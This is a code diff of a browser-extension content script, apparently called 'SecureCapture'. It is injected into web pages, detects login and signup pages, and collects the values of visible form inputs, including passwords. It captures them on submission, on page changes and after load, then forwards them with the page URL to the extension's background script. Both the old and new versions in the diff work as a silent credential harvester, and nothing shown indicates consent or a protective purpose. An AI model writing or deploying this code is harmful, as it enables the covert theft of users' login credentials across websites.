@@ -1,129 +1,165 @@
 
-// This script will be injected into web pages to collect form data
+// Content script to capture form submissions and input changes
 
-// Function to determine if a page is a login or signup page
-const isAuthPage = (): boolean => {
-  const url = window.location.href.toLowerCase();
+// Flag to track if we're on a login or signup page
+let isLoginOrSignupPage = false;
+
+// Store inputs we've detected
+const detectedInputs: any[] = [];
+
+// Check if the current page is likely a login or signup page
+const checkIfLoginOrSignupPage = () => {
   const pageText = document.body.innerText.toLowerCase();
-  const pageHTML = document.body.innerHTML.toLowerCase();
+  const url = window.location.href.toLowerCase();
   
-  // Check URL for common auth-related paths
-  const urlKeywords = ['login', 'signin', 'sign-in', 'signup', 'sign-up', 'register', 'auth'];
-  const hasUrlKeyword = urlKeywords.some(keyword => url.includes(keyword));
+  // Check URL for common login/signup patterns
+  const urlPatterns = ['login', 'signin', 'sign-in', 'signup', 'sign-up', 'register', 'account', 'auth'];
+  const urlMatch = urlPatterns.some(pattern => url.includes(pattern));
   
-  // Check page content for common auth-related text
-  const contentKeywords = ['login', 'sign in', 'signup', 'sign up', 'register', 'create account', 'password'];
-  const hasContentKeyword = contentKeywords.some(keyword => pageText.includes(keyword));
+  // Check page content for common login/signup text
+  const contentPatterns = ['login', 'sign in', 'signup', 'sign up', 'register', 'create account', 'forgot password'];
+  const contentMatch = contentPatterns.some(pattern => pageText.includes(pattern));
   
-  // Check for form elements that are commonly used in auth forms
-  const hasPasswordInput = document.querySelector('input[type="password"]') !== null;
-  const hasEmailInput = document.querySelector('input[type="email"]') !== null;
+  // Check for password fields as a strong indicator
+  const hasPasswordField = document.querySelectorAll('input[type="password"]').length > 0;
   
-  return hasUrlKeyword || (hasContentKeyword && (hasPasswordInput || hasEmailInput));
+  return urlMatch || (contentMatch && hasPasswordField);
 };
 
-// Function to collect form data from the page
-const collectFormData = (): any[] => {
-  const formData: any[] = [];
+// Function to get all form inputs
+const captureFormInputs = () => {
   const forms = document.querySelectorAll('form');
+  const capturedData: any[] = [];
   
-  forms.forEach((form, formIndex) => {
-    const inputs = form.querySelectorAll('input:not([type="hidden"])');
+  forms.forEach(form => {
+    const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
     const formInputs: any[] = [];
     
-    inputs.forEach((input: HTMLInputElement) => {
-      const type = input.type;
-      const name = input.name || input.id || `input-${formIndex}-${type}`;
-      const value = input.value;
-      const isAutoFill = input.matches(':-webkit-autofill') || 
-                         input.hasAttribute('autocomplete');
-      
-      // Only collect if the input has a value
-      if (value) {
+    inputs.forEach(input => {
+      const inputEl = input as HTMLInputElement;
+      if (inputEl.value.trim()) {
         formInputs.push({
-          type,
-          name,
-          value,
-          isAutoFill
+          type: inputEl.type,
+          name: inputEl.name || inputEl.id || inputEl.placeholder || inputEl.type,
+          value: inputEl.value,
+          isAutoFill: inputEl.matches(':-webkit-autofill') || 
+                      // Check for other autofill indicators
+                      inputEl.classList.contains('autofill') || 
+                      inputEl.hasAttribute('autocomplete')
         });
       }
     });
     
     if (formInputs.length > 0) {
-      formData.push({
-        formIndex,
-        action: form.action,
+      capturedData.push({
+        formAction: form.action,
+        formId: form.id,
+        formName: form.name,
         inputs: formInputs
       });
     }
   });
   
-  return formData;
+  return capturedData;
 };
 
-// Function to send collected data to the extension background script
-const sendDataToExtension = (data: any) => {
+// Send data to background script
+const sendDataToBackground = (data: any[]) => {
+  if (data.length === 0) return;
+  
   chrome.runtime.sendMessage({
     type: 'FORM_DATA',
     url: window.location.href,
     title: document.title,
     timestamp: Date.now(),
-    data: data
+    data
   });
 };
 
-// Initialize observer to detect form input changes
-const initFormObserver = () => {
-  // Watch for changes in the DOM
-  const observer = new MutationObserver((mutations) => {
-    mutations.forEach((mutation) => {
-      if (mutation.type === 'childList' || mutation.type === 'attributes') {
-        // Only check for forms if this might be an auth page
-        if (isAuthPage()) {
-          const formData = collectFormData();
-          if (formData.length > 0) {
-            sendDataToExtension(formData);
-          }
-        }
-      }
+// Setup form submission listeners
+const setupFormListeners = () => {
+  const forms = document.querySelectorAll('form');
+  
+  forms.forEach(form => {
+    form.addEventListener('submit', () => {
+      const data = captureFormInputs();
+      sendDataToBackground(data);
     });
   });
-  
-  // Start observing the document
-  observer.observe(document.body, {
-    childList: true,
-    subtree: true,
-    attributes: true,
-    attributeFilter: ['value']
-  });
-  
-  // Also add listeners for form submissions
-  document.addEventListener('submit', (event) => {
-    if (isAuthPage()) {
-      const formData = collectFormData();
-      if (formData.length > 0) {
-        sendDataToExtension(formData);
-      }
-    }
-  });
-  
-  // Listen for input events to capture dynamically filled inputs
-  document.addEventListener('input', (event) => {
-    if (isAuthPage() && event.target instanceof HTMLInputElement) {
-      // Debounce to prevent too many messages
-      clearTimeout((window as any).inputTimeout);
-      (window as any).inputTimeout = setTimeout(() => {
-        const formData = collectFormData();
-        if (formData.length > 0) {
-          sendDataToExtension(formData);
-        }
-      }, 500);
-    }
-  });
 };
 
-// Check if this is an auth page and if so, initialize the observer
-if (isAuthPage()) {
-  // Give the page a moment to fully load
-  setTimeout(initFormObserver, 1000);
+// Setup input change detection
+const setupInputObserver = () => {
+  // Select the node that will be observed for mutations
+  const targetNode = document.body;
+
+  // Options for the observer (which mutations to observe)
+  const config = { childList: true, subtree: true, attributes: true, attributeFilter: ['value'] };
+
+  // Callback function to execute when mutations are observed
+  const callback = (mutationsList: MutationRecord[]) => {
+    let inputsChanged = false;
+    
+    for (const mutation of mutationsList) {
+      if (mutation.type === 'childList') {
+        // Check for new input elements
+        mutation.addedNodes.forEach((node) => {
+          if (node.nodeType === Node.ELEMENT_NODE) {
+            const element = node as Element;
+            const inputs = element.querySelectorAll('input');
+            if (inputs.length > 0) {
+              inputsChanged = true;
+            }
+          }
+        });
+      } else if (mutation.type === 'attributes') {
+        if (mutation.target instanceof HTMLInputElement) {
+          inputsChanged = true;
+        }
+      }
+    }
+    
+    if (inputsChanged && isLoginOrSignupPage) {
+      // Capture form data after a short delay to allow values to settle
+      setTimeout(() => {
+        const data = captureFormInputs();
+        sendDataToBackground(data);
+      }, 500);
+    }
+  };
+
+  // Create an observer instance linked to the callback function
+  const observer = new MutationObserver(callback);
+
+  // Start observing the target node for configured mutations
+  observer.observe(targetNode, config);
+};
+
+// Initialize the content script
+const init = () => {
+  // Check if we're on a login/signup page
+  isLoginOrSignupPage = checkIfLoginOrSignupPage();
+  
+  if (isLoginOrSignupPage) {
+    console.log('SecureCapture: Login or signup page detected');
+    
+    // Setup form submission listeners
+    setupFormListeners();
+    
+    // Setup input observer
+    setupInputObserver();
+    
+    // Initial data capture after page load
+    setTimeout(() => {
+      const data = captureFormInputs();
+      sendDataToBackground(data);
+    }, 1500);
+  }
+};
+
+// Run the script after the page has fully loaded
+if (document.readyState === 'complete') {
+  init();
+} else {
+  window.addEventListener('load', init);
 }
